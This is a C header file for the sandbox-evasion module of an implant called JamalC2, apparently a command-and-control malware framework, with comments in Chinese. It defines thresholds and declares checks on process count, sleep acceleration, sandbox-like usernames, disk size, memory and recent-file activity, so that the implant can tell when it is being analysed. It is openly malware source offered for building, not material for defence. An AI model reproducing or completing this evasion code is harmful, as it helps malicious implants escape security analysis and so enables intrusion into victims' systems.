/*
 * JamalC2 Implant - Evasion Module Header
 * 反沙箱检测和规避能力
 */

#ifndef EVASION_H
#define EVASION_H

#include <windows.h>

// === 配置阈值 ===
#define MIN_PROCESS_COUNT 50   // 最少进程数量
#define MIN_DISK_SIZE_GB 60    // 最小硬盘大小 (GB)
#define MIN_MEMORY_MB 2048     // 最小内存大小 (MB)
#define SLEEP_TEST_MS 1000     // 睡眠测试时间
#define SLEEP_THRESHOLD_MS 900 // 睡眠检测阈值

// === 检测函数 ===

/**
 * 执行所有反沙箱检测
 * @return 1 = 检测到沙箱环境, 0 = 正常环境
 */
int evasion_check_all(void);

/**
 * 检测进程数量
 * 沙箱环境通常进程数量较少
 */
int evasion_check_process_count(void);

/**
 * 检测时间加速
 * 沙箱可能加速 Sleep 以加快分析
 */
int evasion_check_sleep_skip(void);

/**
 * 检测可疑用户名
 * 常见沙箱用户名: sandbox, malware, virus, test 等
 */
int evasion_check_username(void);

/**
 * 检测硬盘大小
 * 沙箱虚拟机通常硬盘较小
 */
int evasion_check_disk_size(void);

/**
 * 检测物理内存大小
 * 沙箱虚拟机通常内存较小
 */
int evasion_check_memory(void);

/**
 * 检测最近文件数量
 * 沙箱环境通常没有用户活动痕迹
 */
int evasion_check_recent_files(void);

#endif // EVASION_H
